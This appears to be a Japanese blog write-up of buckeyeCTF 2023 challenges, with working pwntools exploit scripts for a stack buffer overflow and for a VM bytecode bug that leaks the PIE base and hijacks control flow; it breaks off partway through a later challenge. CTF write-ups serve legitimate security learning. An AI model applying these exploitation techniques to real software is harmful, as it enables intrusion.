@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>buckeyeCTF 2023 | House-of-Rona</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://blog.rqda.wtf/style.css">
+    <link rel="stylesheet" href="https://blog.rqda.wtf/color/green-auto.css">
+
+        <link rel="stylesheet" href="https://blog.rqda.wtf/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://blog.rqda.wtf/font-hack-subset.css">
+
+        <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
+    
+<link rel="stylesheet" href="https://blog.rqda.wtf/footnote.css">
+<link rel="stylesheet" href="https://blog.rqda.wtf/page.css">
+<link rel="stylesheet" href="https://www.nerdfonts.com/assets/css/webfont.css">
+
+<meta name="google-site-verification" content="I4O4hRvGX4CkU3wvuZTczjjZFLuG3YINxBvx2be_tHY">
+<link rel="stylesheet" href="https://blog.rqda.wtf/icon.css">
+
+<meta property="og:title" content="buckeyeCTF 2023 | House-of-Rona">
+<meta property="og:image" content="https://github.com/rqdaA.png">
+<meta name="twitter:site" content="@907903">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="buckeyeCTF 2023 | House-of-Rona">
+<meta name="twitter:image" content="https://github.com/rqdaA.png">
+<meta property="author" content="Rona (rqdaA)">
+<meta property="description" content="Solidityは難しい">
+<meta property="og:description" content="Solidityは難しい">
+
+
+</head>
+
+<body class="">
+<div class="container">
+    
+<header class="header">
+    <div class="header__inner">
+        <div class="header__logo">
+            
+            <img src="https://github.com/rqdaA.png" alt="">
+            
+            
+            <a href="https://blog.rqda.wtf" style="text-decoration: none;">
+                <div class="logo">
+                    
+                    House-of-Rona
+                    
+                </div>
+            </a>
+        </div>
+    </div>
+
+    
+    <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://blog.rqda.wtf/tags"><i class='nf nf-oct-tag'></i>tags</a></li>
+            
+                <li><a href="https://blog.rqda.wtf/about"><i class='nf nf-dev-github_alt'></i>whoami</a></li>
+            
+                <li><a href="https://github.com/rqdaA" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-github_inverted'></i>github</a></li>
+            
+                <li><a href="https://twitter.com/907903" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-twitter'></i>twitter</a></li>
+            </ul>
+        </nav>
+    
+    
+    
+</header>
+
+
+    <div class="content">
+        
+<div class="post">
+    
+    <h1 class="post-title"><a href="https://blog.rqda.wtf/buckeye-2023/">buckeyeCTF 2023</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2023-10-02
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/buffer-overflow/">#Buffer Overflow</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/blockchain/">#blockchain</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/pwn/">#pwn</a></span>
+    
+
+    
+    <h1>Table of Content</h1>
+    <ul>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#pwn-beginner-menu">[pwn] Beginner Menu</a>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#pwn-starter-buffer">[pwn] Starter Buffer</a>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#pwn-igpay-atinlay-natoriay">[pwn] Igpay Atinlay Natoriay</a>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#pwn-bugsworld">[pwn] Bugsworld</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#fen-xi">分析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#cui-ruo-xing">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#gong-ji">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#sukuriputo">スクリプト</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#pwn-fuc">[pwn] FUC</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#fen-xi-1">分析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#cui-ruo-xing-1">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#gong-ji-1">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/buckeye-2023/#sukuriputo-1">スクリプト</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#misc-new-management">[misc] New Management</a>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#pwn-lossless">[pwn] LossLess</a>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#misc-anyft">[misc] aNyFT</a>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/buckeye-2023/#zhong-warini">終わりに</a>
+            
+        </li>
+        
+    </ul>
+    <hr>
+    
+
+    
+        <div class="post-content">
+            <p><a href="https://ctftime.org/event/2074">BuckeyeCTF</a>に出場しました。
+コンテスト中にpwn5問とmisc1問をとき、コンテスト後にlosslessとaNyFTを追加で解きました。</p>
+<h1 id="pwn-beginner-menu">[pwn] Beginner Menu</h1>
+<p>入力された番号に対して<code>atoi</code>を呼び出します。</p>
+<ul>
+<li>1 &lt;= n &lt;= 4 のときは用意された関数を実行し<code>exit</code></li>
+<li>5 &lt;= n のときは&quot;Not an Option&quot;と表示し<code>exit</code></li>
+<li>そうでない場合はflagを出力</li>
+</ul>
+<p>という実装がされているので-1を入力するとflagが出てきます。</p>
+<p>Flag: <code>bctf{y0u_ARe_sNeaKy}</code></p>
+<h1 id="pwn-starter-buffer">[pwn] Starter Buffer</h1>
+<p>自明なStack Buffer Overflowがあります。flag変数の値を書き換えてあげればいいです。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i : i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(elf_name, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>(
+</span><span>                elf_name, script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name}
+</span><span>            )
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(elf_name, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">: </span><span>&quot;, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">0x3C </span><span>+ </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x45454545</span><span>))
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">0
+</span><span>debug = </span><span style="color:#d08770;">0
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./buffer</span><span>&quot;
+</span><span>libc_name = &quot;&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">chall.pwnoh.io 13372</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span style="color:#65737e;"># libc: ELF = ELF(libc_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span>&quot;&quot;&quot;
+</span><span>t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span style="color:#bf616a;">solve</span><span>()
+</span></code></pre>
+<p><code>Flag:bctf{wHy_WriTe_OveR_mY_V@lUeS}</code></p>
+<h1 id="pwn-igpay-atinlay-natoriay">[pwn] Igpay Atinlay Natoriay</h1>
+<p>Rustに実行時エラーを起こさせるとフラグがもらえます。</p>
+<p>実験している最中に誤って<code>ｆ</code>を入力したらフラグが降ってきました。
+落ち着いて考えるとrustはUFT-8として不正な文字列を持てない(はず？)ので、マルチバイト文字を入力するとここでコケます。</p>
+<pre data-lang="rust" style="background-color:#2b303b;color:#c0c5ce;" class="language-rust "><code class="language-rust" data-lang="rust"><span>    </span><span style="color:#b48ead;">let</span><span> first = &amp;word[</span><span style="color:#d08770;">0</span><span>..</span><span style="color:#d08770;">1</span><span>];
+</span></code></pre>
+<p><code>flag:bctf{u$trAy_1SyAy_Af3$ay_aNDy@Y_3cUR3s@y}</code></p>
+<h1 id="pwn-bugsworld">[pwn] Bugsworld</h1>
+<p>VM問です。17個の命令が用意されていますが、実際に実装されているのは11個のみです。</p>
+<h2 id="fen-xi">分析</h2>
+<p>Bytecodeを与え、盤面の中を自由に動くことができる、というバイナリが渡されます。</p>
+<p>セキュリティ機構はすべてonになっています。</p>
+<ul>
+<li>Full RELRO</li>
+<li>Canary found</li>
+<li>NX enabled</li>
+<li>PIE enabled</li>
+</ul>
+<h2 id="cui-ruo-xing">脆弱性</h2>
+<h3 id="pie-base-leak">PIE base leak</h3>
+<p>win関数が実装されているのでPIE baseのleakさえできればよいです。これは<code>bytecode[i]</code>
+に入力された値がサニタイズされる前に<code>printf</code>が呼び出されていることを利用します。</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>  </span><span style="color:#b48ead;">for </span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; n; i++) {
+</span><span>    </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#d08770;">%s</span><span>&quot;, instruction_names[bytecode[i]]);
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(bytecode[i] &lt; </span><span style="color:#d08770;">0 </span><span>|| bytecode[i] &gt; </span><span style="color:#d08770;">16</span><span>) {
+</span><span>      </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Invalid instruction</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>    }
+</span><span>    ...
+</span></code></pre>
+<h3 id="ripnoduo-qu">RIPの奪取</h3>
+<p>VMは一旦入力を受け取ってそれをサニタイズしたら<code>bytecode[state.pc] != INSTRUCTION_HALT</code>である限り実行を続けます。</p>
+<p><code>INSTRUCTION_HALT</code>は受け取った命令の最後に挿入されます。
+すなわちこれを超えることが出来ればその後ろの非サニタイズ済みな命令を実行することができるというわけです。</p>
+<p><code>INSTRUCTION_HALT</code>を超えるために使えそうなパスとして<code>dont_jump</code>関数があります。
+これを我々が呼び出せる最後の命令で実行できれば<code>INSTRUCTION_HALT</code>のbypassができそうです。</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">dont_jump</span><span>(State *</span><span style="color:#bf616a;">state</span><span>) {
+</span><span>  state-&gt;pc++;
+</span><span>  state-&gt;pc++;
+</span><span>}
+</span></code></pre>
+<p>これは<code>do_jump_if_not_next_is_empty</code>から呼び出すことができます。</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">do_jump_if_not_next_is_empty</span><span>(State *</span><span style="color:#bf616a;">state</span><span>) {
+</span><span>  </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">next_is_out_of_bounds</span><span>(state))
+</span><span>    </span><span style="color:#bf616a;">do_jump</span><span>(state);
+</span><span>  </span><span style="color:#b48ead;">else
+</span><span>    </span><span style="color:#bf616a;">dont_jump</span><span>(state);
+</span><span>}
+</span></code></pre>
+<h2 id="gong-ji">攻撃</h2>
+<p>呼び出しは以下のコードで行われます。</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>    instruction_table[bytecode[state.</span><span style="color:#bf616a;">pc</span><span>]](&amp;state);
+</span></code></pre>
+<p><code>bytecode[state.pc]</code>は任意の値にすることができるので
+<code>getFlag</code>
+のアドレスをメモリ上のいずれかに置き、
+<code>instruction_table</code>
+からのオフセットを設定することでRIPが奪取できます。</p>
+<h2 id="sukuriputo">スクリプト</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i : i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#bf616a;">INSTRUCTION_MOVE </span><span>= </span><span style="color:#d08770;">0
+</span><span style="color:#bf616a;">INSTRUCTION_TURNLEFT </span><span>= </span><span style="color:#d08770;">1
+</span><span style="color:#bf616a;">INSTRUCTION_TURNRIGHT </span><span>= </span><span style="color:#d08770;">2
+</span><span style="color:#bf616a;">INSTRUCTION_INFECT </span><span>= </span><span style="color:#d08770;">3
+</span><span style="color:#bf616a;">INSTRUCTION_SKIP </span><span>= </span><span style="color:#d08770;">4
+</span><span style="color:#bf616a;">INSTRUCTION_HALT </span><span>= </span><span style="color:#d08770;">5
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP </span><span>= </span><span style="color:#d08770;">6
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_EMPTY </span><span>= </span><span style="color:#d08770;">7
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_EMPTY </span><span>= </span><span style="color:#d08770;">8
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_WALL </span><span>= </span><span style="color:#d08770;">9
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_WALL </span><span>= </span><span style="color:#d08770;">10
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_FRIEND </span><span>= </span><span style="color:#d08770;">11
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_FRIEND </span><span>= </span><span style="color:#d08770;">12
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_ENEMY </span><span>= </span><span style="color:#d08770;">13
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_ENEMY </span><span>= </span><span style="color:#d08770;">14
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_RANDOM </span><span>= </span><span style="color:#d08770;">15
+</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_TRUE </span><span>= </span><span style="color:#d08770;">16
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(elf_name, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>(
+</span><span>                elf_name, script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name}
+</span><span>            )
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(elf_name, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">bytecode?</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">&gt; </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">3</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#bf616a;">INSTRUCTION_HALT</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#bf616a;">INSTRUCTION_SKIP</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">255</span><span>))
+</span><span>    buf = t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">Invalid instruction</span><span>&quot;)[: -</span><span style="color:#96b5b4;">len</span><span>(&quot;</span><span style="color:#a3be8c;">Invalid instruction</span><span>&quot;)]
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">SKIP</span><span>&quot;) + </span><span style="color:#d08770;">5 </span><span>:]
+</span><span>    pie_base = </span><span style="color:#bf616a;">s2u64</span><span>(buf) - </span><span style="color:#d08770;">0x134D
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{pie_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>    </span><span style="color:#b48ead;">assert </span><span>not pie_base &amp; </span><span style="color:#d08770;">0xFFF
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">bytecode?</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">&gt; </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">4</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#bf616a;">INSTRUCTION_SKIP</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#bf616a;">INSTRUCTION_SKIP</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">0xD8 </span><span>// </span><span style="color:#d08770;">8</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(pie_base + elf.sym[&quot;</span><span style="color:#a3be8c;">win</span><span>&quot;]))
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">bytecode?</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">&gt; </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">1</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#bf616a;">INSTRUCTION_JUMP_IF_NOT_NEXT_IS_EMPTY</span><span>))
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">0
+</span><span>debug = </span><span style="color:#d08770;">0
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./bugsworld</span><span>&quot;
+</span><span>libc_name = &quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;
+</span><span style="color:#65737e;"># remote_addr, remote_port = &quot;localhost 60001&quot;.split()
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">chall.pwnoh.io 13382</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span>libc: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(libc_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span style="color:#a3be8c;">b *run_program+537
+</span><span>&quot;&quot;&quot;
+</span><span>t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span style="color:#bf616a;">solve</span><span>()
+</span></code></pre>
+<p><code>flag:bctf{7h3_w0rld_15_fu11_0f_bu65_295c62b69}</code></p>
+<h1 id="pwn-fuc">[pwn] FUC</h1>
+<h2 id="fen-xi-1">分析</h2>
+<p>0x18Fの正方形の盤面上をwasdで自由に動けます。
+この盤面の内1つがあたりのマスとなっていて、そこに動くことでフラグを得ることができます。
+ただしトラップのマスも用意されており、そのマスを踏むとプログラムが終了してしまうので、どうにかしてそのマスにたどり着くことが出来ればフラグが得られます。</p>
+<p>まず、バイナリの確認をします。セキュリティ機構はすべてオンになっています。</p>
+<ul>
+<li>Full RELRO</li>
+<li>Canary found</li>
+<li>NX enabled</li>
+<li>PIE enabled</li>
+</ul>
+<h2 id="cui-ruo-xing-1">脆弱性</h2>
+<p>頑張ってリバーシングをします。</p>
+<p>その結果、あたりのマスは盤面の四隅にある0x19の正方形内に存在し、最初にスポーンする位置は <code>0x25 &lt;= x,y &lt;= 0x183</code>
+であることがわかりました。
+加えて2つの脆弱性を見つけました。</p>
+<ol>
+<li>srand(time(0))</li>
+<li>移動方向入力時のBoF</li>
+</ol>
+<p>あたりのマスは<code>random</code>関数を使って決定されているため、そのシード値が分かればあたりのマスの位置を知ることができます。
+しかしマスの初期化フェーズでは0x10000回以上<code>random</code>関数が呼ばれており、更にその中には<code>random</code>関数の値によって<code>random</code>
+関数の呼び出し回数が変わるパスもありこの手法は断念しました。</p>
+<p>次に移動方向入力時のBoFですが、<code>sub_2F7A</code>において<code>rbp-0xD</code>に存在する変数に対して0x25byteの入力が行える脆弱性があります。
+これを用いてleakとトラップからの復帰を行います。</p>
+<h3 id="canary-pie-base-leak">canary &amp; PIE base leak</h3>
+<p>canaryは<code>rbp-0x8</code>に存在しており、その1byte目は\x00なので、無効な文字を7文字入力してあげるとleakすることができます。
+
+<div class="inserted_img">
